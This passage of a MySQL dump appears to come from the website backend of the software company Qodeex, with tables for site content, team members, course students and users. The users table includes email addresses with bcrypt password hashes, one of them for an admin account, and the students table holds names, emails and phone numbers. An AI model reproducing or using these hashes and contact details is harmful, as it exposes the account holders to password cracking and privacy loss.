INSERT INTO `infos` (`id`, `title`, `description`, `keywords`, `email`, `logo`, `icon`, `facebook`, `twitter`, `linkedin`, `instagram`, `github`, `map`, `phone`, `created_at`, `updated_at`) VALUES
(1, '{\"en\":\"Qodeex\",\"ar\":\"كودكس للبرمجيات والتدريب\"}', '{\"en\":\"We’d love to share our values, company life, achievements, and everything that makes us what we are\",\"ar\":\"We’d love to share our values, company life, achievements, and everything that makes us what we are\"}', 'software company,qodeex,كوديكس,شركة برمجيات,web,mobile,AI,Machine Learing,الذكاء الإصطناعى', 'qodeex@outlook.com', '1600694981780.png', '1600695261170.png', 'https://www.facebook.com/qodeex', 'https://twitter.com', 'https://linkedin.com', 'https://instagram.com', 'https://github.com/Qodeex', '<iframe src=\"https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d3456.1386738727124!2d30.943348164994976!3d29.97544442878403!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x145857883f371df9%3A0xf54b1dee54b5fbf8!2z2YPZiNiv2YPYsyDZhNiq2LfZiNmK2LEg2KfZhNio2LHZhdis2YrYp9iqINmI2KfZhNiq2K_YsdmK2Kg!5e0!3m2!1sen!2seg!4v1602422555730!5m2!1sen!2seg\" width=\"600\" height=\"450\" frameborder=\"0\" style=\"border:0;\" allowfullscreen=\"\" aria-hidden=\"false\" tabindex=\"0\"></iframe>', '+201116063026', '2020-08-06 05:49:55', '2020-10-11 09:22:46');

-- --------------------------------------------------------

--
-- Table structure for table `partners`
--

CREATE TABLE `partners` (
  `id` int(10) UNSIGNED NOT NULL,
  `logo` varchar(100) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `created_at` datetime DEFAULT NULL,
  `updated_at` datetime DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `partners`
--

INSERT INTO `partners` (`id`, `logo`, `created_at`, `updated_at`) VALUES
(2, '1597580324513.png', '2020-08-16 08:18:44', '2020-08-16 08:18:44');

-- --------------------------------------------------------

--
-- Table structure for table `sliders`
--

CREATE TABLE `sliders` (
  `id` int(10) UNSIGNED NOT NULL,
  `title` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `brief` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `img` varchar(100) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `page` varchar(100) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `created_at` datetime DEFAULT NULL,
  `updated_at` datetime DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `sliders`
--

INSERT INTO `sliders` (`id`, `title`, `brief`, `img`, `page`, `created_at`, `updated_at`) VALUES
(1, '{\"en\":\"We Build Softwares that Create Flex\",\"ar\":\"We Build Softwares that Create Flex\"}', '{\"en\":\"Getting your application right makes everything else easier.\",\"ar\":\"Getting your application right makes everything else easier.\"}', '1596707654559.svg', '{\"en\":\"home\",\"ar\":\"الرئيسية\"}', '2020-08-06 05:54:14', '2020-11-29 03:12:41'),
(2, '{\"en\":\"We develop intelligent Softwares solutions that help business owners grow\",\"ar\":\"We develop intelligent Softwares solutions that help business owners grow\"}', '{\"en\":\"We enjoy crafting great quality code without losing sight of the value of validating the business concept.\",\"ar\":\"We enjoy crafting great quality code without losing sight of the value of validating the business concept.\"}', '1596707699137.svg', '{\"en\":\"company\",\"ar\":\"شركة\"}', '2020-08-06 05:54:59', '2020-08-16 06:18:55'),
(3, '{\"en\":\"Team Qodeex\",\"ar\":\"Team Qodeex\"}', '{\"en\":\"We\'d love to share values, company life, achievements, and everything that makes us what we are.\",\"ar\":\"We\'d love to share values, company life, achievements, and everything that makes us what we are.\"}', '1597573988832.jpg', '{\"en\":\"team\",\"ar\":\"فريق\"}', '2020-08-06 05:55:12', '2020-08-16 06:33:38'),
(4, '{\"en\":\"Services\",\"ar\":\"Services\"}', '{\"en\":\"We develop software applications to make your work be managed easier \",\"ar\":\"We develop software applications to make your work be managed easier \"}', '1596707726845.svg', '{\"en\":\"services\",\"ar\":\"خدمات\"}', '2020-08-06 05:55:26', '2020-09-21 17:44:39'),
(10, '{\"en\":\"We Build Websites & Web applications\",\"ar\":\"We Build Websites & Web applications\"}', '{\"en\":\"We\'d love to share values, company life, achievements, and everything that makes us what we are.\",\"ar\":\"We\'d love to share values, company life, achievements, and everything that makes us what we are.\"}', '1596722853298.svg', '{\"en\":\"web\",\"ar\":\"ويب\"}', '2020-08-06 09:59:55', '2020-08-16 08:32:09'),
(11, '{\"en\":\"We Build Mobile applications\",\"ar\":\"We Build Mobile applications\"}', '{\"en\":\"We\'d love to share values, company life, achievements, and everything that makes us what we are.\",\"ar\":\"We\'d love to share values, company life, achievements, and everything that makes us what we are.\"}', '1596722821298.svg', '{\"en\":\"mobile\",\"ar\":\"موبايل\"}', '2020-08-06 10:00:51', '2020-08-16 09:02:39'),
(12, '{\"en\":\"We Create Beautiful UI Designs\",\"ar\":\"We Create Beautiful UI Designs\"}', '{\"en\":\"We\'d love to share values, company life, achievements, and everything that makes us what we are.\",\"ar\":\"We\'d love to share values, company life, achievements, and everything that makes us what we are.\"}', '1596722821298.svg', '{\"en\":\"ui-ux\",\"ar\":\"تصميم\"}', '2020-08-06 10:02:01', '2020-09-21 09:51:10');

-- --------------------------------------------------------

--
-- Table structure for table `statistics`
--

CREATE TABLE `statistics` (
  `id` int(11) NOT NULL,
  `qty` varchar(10) DEFAULT NULL,
  `icon` varchar(50) DEFAULT NULL,
  `title` varchar(255) DEFAULT NULL,
  `created_at` timestamp NOT NULL DEFAULT current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Dumping data for table `statistics`
--

INSERT INTO `statistics` (`id`, `qty`, `icon`, `title`, `created_at`) VALUES
(1, '5', 'fa fa-user', '{\"en\":\"Clients\",\"ar\":\"عملاء\"}', '2021-01-13 14:44:39'),
(2, '1', 'fa fa-user', '{\"en\":\"Partners\",\"ar\":\"شركاء\"}', '2021-01-13 14:44:39'),
(3, '16', 'fa fa-tasks', '{\"en\":\"Projects\",\"ar\":\"مشاريع\"}', '2021-01-13 14:44:39');

-- --------------------------------------------------------

--
-- Table structure for table `students`
--

CREATE TABLE `students` (
  `id` int(10) UNSIGNED NOT NULL,
  `name` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `email` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `phone` int(11) DEFAULT NULL,
  `address` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `brunch` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `courseId` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `created_at` datetime DEFAULT NULL,
  `updated_at` datetime DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `students`
--

INSERT INTO `students` (`id`, `name`, `email`, `phone`, `address`, `brunch`, `courseId`, `created_at`, `updated_at`) VALUES
(1, 'mohamed', 'mohamedbadar@qodeex.com', 2147483647, 'hosary', 'page', 'vue', '2020-11-23 03:54:38', '2020-11-23 03:54:38'),
(3, 'mohamed', 'mohamedbadar@qodeex.com', 2147483647, 'hosary', 'page', 'vue', '2020-11-23 04:34:35', '2020-11-23 04:34:35'),
(5, 'reem', 'ddd@gmail.com', 12142515, 'fffff', 'october', '1', '2020-11-23 07:36:22', '2020-11-23 07:36:22'),
(8, 'nnnn', 'nnnnn', 0, 'nnnnn', 'october', '1', '2020-11-23 14:07:54', '2020-11-23 14:07:54'),
(9, 'nnnn', 'nnnnn', 0, 'nnnnn', 'october', '1', '2020-11-23 14:07:54', '2020-11-23 14:07:54'),
(10, 'reem', 'ddd@gmail.com', 0, 'mmmm', 'october', '2', '2020-11-23 15:15:25', '2020-11-23 15:15:25'),
(14, 'mohamed', 'mohamed@gmail.com', 11255555, '6th october', 'october', '2', '2020-11-24 02:45:56', '2020-11-24 02:45:56'),
(15, 'mohamed', 'mohamed@gmail.com', 11255555, '6th october', 'october', '2', '2020-11-24 02:45:56', '2020-11-24 02:45:56'),
(16, 'test', 'test@gmail.com', 1111, 'test', 'test', '4', '2020-12-02 07:09:09', '2020-12-02 07:09:09'),
(17, 'test', 'test@gmail.com', 1111, 'test', 'test', '4', '2020-12-02 07:09:09', '2020-12-02 07:09:09');

-- --------------------------------------------------------

--
-- Table structure for table `teams`
--

CREATE TABLE `teams` (
  `id` int(10) UNSIGNED NOT NULL,
  `img` varchar(100) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `name` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `job` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `created_at` datetime DEFAULT NULL,
  `updated_at` datetime DEFAULT NULL,
  `facebook` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `linkedin` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `teams`
--

INSERT INTO `teams` (`id`, `img`, `name`, `job`, `created_at`, `updated_at`, `facebook`, `linkedin`) VALUES
(5, '1597845227389.svg', '{\"en\":\"Ahmed Hashem\",\"ar\":\"أحمد هاشم\"}', '{\"en\":\"CEO & CO-Founder\",\"ar\":\"CEO & CO-Founder\"}', '2020-08-19 09:43:59', '2020-09-22 08:21:29', 'https://facebook.com/Arshmedis', 'https://www.linkedin.com/in/ahmed-hashem-38915a183/'),
(6, '1597845171023.svg', '{\"en\":\"Mohamed Hashem\",\"ar\":\"محمد هاشم\"}', '{\"en\":\"Project Manager\",\"ar\":\"Project Manager\"}', '2020-08-19 09:44:30', '2020-09-22 08:23:30', 'https://facebook.com', 'https://linkedin.com'),
(7, '1597845123180.svg', '{\"en\":\"Ahmed Samir\",\"ar\":\"أحمد سمير\"}', '{\"en\":\"Marketing Officer\",\"ar\":\"Marketing Officer\"}', '2020-08-19 09:46:47', '2020-09-21 09:47:03', 'https://facebook.com', 'https://linkedin.com'),
(8, '1597844807201.svg', '{\"en\":\"Mohamed Mahmoud\",\"ar\":\"محمد محمود\"}', '{\"en\":\"Backend Developer\",\"ar\":\"Backend Developer\"}', '2020-08-19 09:52:03', '2020-09-21 09:48:01', 'https://facebook.com', 'https://linkedin.com');

-- --------------------------------------------------------

--
-- Table structure for table `technologies`
--

CREATE TABLE `technologies` (
  `id` int(10) UNSIGNED NOT NULL,
  `img` varchar(100) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `name` varchar(100) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `created_at` datetime DEFAULT NULL,
  `updated_at` datetime DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `technologies`
--

INSERT INTO `technologies` (`id`, `img`, `name`, `created_at`, `updated_at`) VALUES
(4, '1596721149288.png', 'Node JS', '2020-08-06 09:39:09', '2020-10-10 07:06:56'),
(5, '1596721749185.png', 'JavaScript', '2020-08-06 09:49:09', '2020-08-16 07:13:03'),
(6, '1596721797880.png', 'Vue', '2020-08-06 09:49:57', '2020-08-06 09:49:57'),
(7, '1597574910046.png', 'Tensorflow', '2020-08-16 06:48:30', '2020-08-16 06:48:30'),
(8, '1597575004239.png', 'Python', '2020-08-16 06:50:04', '2020-08-16 06:50:04'),
(9, '1597575357776.png', 'Flutter', '2020-08-16 06:53:47', '2020-08-16 06:55:57'),
(12, '1597575910201.svg', 'Adonis', '2020-08-16 07:05:10', '2020-08-16 07:05:10'),
(13, '1597583962869.png', 'PHP', '2020-08-16 09:19:22', '2020-10-04 11:01:48');

-- --------------------------------------------------------

--
-- Table structure for table `tokens`
--

CREATE TABLE `tokens` (
  `id` int(10) UNSIGNED NOT NULL,
  `user_id` int(10) UNSIGNED DEFAULT NULL,
  `token` varchar(255) CHARACTER SET latin1 NOT NULL,
  `type` varchar(80) CHARACTER SET latin1 NOT NULL,
  `is_revoked` tinyint(1) DEFAULT 0,
  `created_at` datetime DEFAULT NULL,
  `updated_at` datetime DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `users`
--

CREATE TABLE `users` (
  `id` int(10) UNSIGNED NOT NULL,
  `username` varchar(80) NOT NULL,
  `email` varchar(254) NOT NULL,
  `password` varchar(60) NOT NULL,
  `created_at` datetime DEFAULT NULL,
  `updated_at` datetime DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `users`
--

INSERT INTO `users` (`id`, `username`, `email`, `password`, `created_at`, `updated_at`) VALUES
(1, 'Ammar Yasser', 'ammyass2@gmail.com', '$2a$10$Fnli1BQuPQOiWUFnPXrNgeF1k5uX5.tp3coGCahum5uJXu1evp.VG', '2020-08-06 05:49:18', '2020-08-06 05:49:18'),
(2, 'qodeex', 'qodeex@outlook.com', '$2a$10$sil2BbVfufey0niPzMBCg.9UwQ/LT8DLQ29gb/5GKNEZ2uk36.kPq', '2020-08-06 08:00:24', '2020-08-06 08:00:24'),
(3, 'Ahmed Hashem', 'ahmed@email.com', '$2a$10$EPJAf36KqbcflAK5OPkKvO6okhhigTwvemVW6SC8sa5CLn9WIzv7G', '2020-08-06 10:36:28', '2020-08-06 10:36:28'),
(4, 'Admin', 'admin@qodeex.com', '$2a$10$OHSNLuQDt9RKDDkPvmx.BOj8lB6/MCH0J2LIckGtQrjeU3S2ic.qW', '2020-10-04 10:54:35', '2020-10-04 10:54:35'),
(5, '', '', '', '2020-11-21 07:29:43', '2020-11-21 07:29:43'),
(10, 'Reem', 'reem@qodeex.com', '$2a$10$YYPsuwT9C9DEBeVl8GdnPOXusOzfC5LIZcU9vSOQ5WgDMwt2yd9eS', '2020-11-21 07:31:01', '2020-11-21 07:31:01'),
(12, 'mohamed', 'mohamedbadar@qodeex.com', '$2a$10$LN8ED3KW3lf8gqTUTlxkNeDxMBoDollSUqWVUclEH4XvAdYqGGHge', '2020-11-22 02:59:36', '2020-11-22 02:59:36'),
(15, 'xxxx', 'x@gmail.com', '', '2020-11-26 06:41:13', '2020-11-26 06:41:13'),
(18, 'reemreem', 'reemreem@gmail.com', '$2a$10$IJF3HR3fMr.nmdY9q.Jdee8yzy71hO8rkCgmMlnQ8HKA.VyGF9bfe', '2020-11-26 06:42:33', '2020-11-26 06:42:33');

--
-- Indexes for dumped tables
--

--
-- Indexes for table `abouts`
--
ALTER TABLE `abouts`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `adonis_schema`
--
ALTER TABLE `adonis_schema`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `blogs`
--
ALTER TABLE `blogs`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `branches`
--
ALTER TABLE `branches`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `categories`
--
ALTER TABLE `categories`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `clients`
--
ALTER TABLE `clients`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `courses`
--
ALTER TABLE `courses`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `emails`
--
ALTER TABLE `emails`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `experiences`
--
ALTER TABLE `experiences`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `features`
--
ALTER TABLE `features`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `infos`
--
ALTER TABLE `infos`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `partners`
--
ALTER TABLE `partners`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `sliders`
--
ALTER TABLE `sliders`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `statistics`
--
ALTER TABLE `statistics`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `students`
--
ALTER TABLE `students`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `teams`
--
ALTER TABLE `teams`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `technologies`
--
ALTER TABLE `technologies`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `tokens`
--
ALTER TABLE `tokens`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `tokens_token_unique` (`token`),
  ADD KEY `tokens_user_id_foreign` (`user_id`),
  ADD KEY `tokens_token_index` (`token`);

--
-- Indexes for table `users`
--
ALTER TABLE `users`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `users_username_unique` (`username`),
  ADD UNIQUE KEY `users_email_unique` (`email`);

--
-- AUTO_INCREMENT for dumped tables
--

--
-- AUTO_INCREMENT for table `abouts`
--
ALTER TABLE `abouts`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=14;

--
-- AUTO_INCREMENT for table `adonis_schema`
--
ALTER TABLE `adonis_schema`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=20;

--
-- AUTO_INCREMENT for table `blogs`
--
ALTER TABLE `blogs`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=7;

--
-- AUTO_INCREMENT for table `branches`
--
ALTER TABLE `branches`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=3;

--
-- AUTO_INCREMENT for table `categories`
--
ALTER TABLE `categories`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=21;

--
-- AUTO_INCREMENT for table `clients`
--
ALTER TABLE `clients`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=8;

--
-- AUTO_INCREMENT for table `courses`
--
ALTER TABLE `courses`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=5;

--
-- AUTO_INCREMENT for table `emails`
--
ALTER TABLE `emails`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=77;

--
-- AUTO_INCREMENT for table `experiences`
--
ALTER TABLE `experiences`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=24;

--
-- AUTO_INCREMENT for table `features`
--
ALTER TABLE `features`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=5;

--
-- AUTO_INCREMENT for table `infos`
--
ALTER TABLE `infos`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=3;

--
-- AUTO_INCREMENT for table `partners`
--
ALTER TABLE `partners`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=5;

--
-- AUTO_INCREMENT for table `sliders`
--
ALTER TABLE `sliders`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=21;

--
-- AUTO_INCREMENT for table `statistics`
--
ALTER TABLE `statistics`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=4;

--
-- AUTO_INCREMENT for table `students`
--
ALTER TABLE `students`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=18;

--
-- AUTO_INCREMENT for table `teams`
--
ALTER TABLE `teams`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=11;

--
-- AUTO_INCREMENT for table `technologies`
--
ALTER TABLE `technologies`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=15;

--
-- AUTO_INCREMENT for table `tokens`
--
ALTER TABLE `tokens`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `users`
--
ALTER TABLE `users`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=19;

--
-- Constraints for dumped tables
--

--
-- Constraints for table `tokens`
--
ALTER TABLE `tokens`
  ADD CONSTRAINT `tokens_user_id_foreign` FOREIGN KEY (`user_id`) REFERENCES `users` (`id`);
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
